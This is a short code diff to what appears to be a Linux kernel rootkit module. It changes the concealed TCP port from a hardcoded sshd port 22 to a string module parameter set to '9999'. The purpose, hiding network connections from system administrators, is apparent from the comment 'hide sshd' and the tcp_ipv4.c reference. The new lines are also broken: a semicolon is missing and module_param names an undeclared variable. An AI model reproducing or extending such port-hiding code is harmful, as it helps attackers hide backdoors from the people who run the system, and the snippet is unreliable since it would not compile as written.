@@ -7,8 +7,10 @@
 /*from net/ipv4/tcp_ipv4.c*/
 #define TMPSZ 150
 
-/*hide sshd*/
-#define PORT_TO_HIDE 22
+//#define PORT_TO_HIDE 9999
+
+static char* port = "9999"
+module_param(name, charp, S_IRUGO);
 
 MODULE_LICENSE("GPL");
 
